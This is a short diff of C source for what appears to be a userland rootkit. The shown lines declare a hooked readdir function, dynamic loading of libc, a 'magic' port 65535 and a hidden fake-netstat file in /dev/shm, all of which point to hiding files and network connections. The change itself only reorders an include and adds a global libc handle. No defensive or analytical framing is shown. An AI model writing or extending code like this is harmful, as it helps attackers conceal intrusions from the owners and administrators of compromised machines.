@@ -4,9 +4,9 @@
 #include <string.h>
 #include <dirent.h>
 #include <linux/fs.h>
-#include <regex.h>
 #include <stdlib.h>
 #include <errno.h>
+#include <regex.h>
 // #define DEBUG
 
 #define LIBC "libc.so.6"
@@ -14,6 +14,7 @@
 #define MAGIC_PORT 65535
 #define FAKE_NETSTAT_FILE "/dev/shm/.smirknet-"
 
+void *libc;
 void *load_libc(char *);
 
 struct dirent *(*hooked_readdir)(DIR *);
